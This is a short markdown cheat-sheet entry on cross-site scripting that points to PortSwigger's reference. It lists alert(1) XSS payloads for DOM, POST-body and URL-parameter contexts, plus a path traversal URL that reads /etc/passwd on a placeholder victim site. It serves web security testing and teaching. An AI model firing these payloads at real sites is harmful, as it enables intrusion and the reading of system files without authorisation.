---
title: XSS Cheat Sheet
desc: Cross-site scripting cheat sheet provided by PortSwigger.
tags: [XSS]
alts: [BurpSuite, OwaspZap]
website: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
---

## DOM

```html
<img src=1 onerror='alert(1)' />
```

<br />

## POST request body

```
id=2&message=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

<br />

## URL parameter

```html
http://victim.com/item?id=<script>alert(1)</script>

<!-- Path traversal -->
http://victim.com/item?id=/../../../../etc/passwd
```
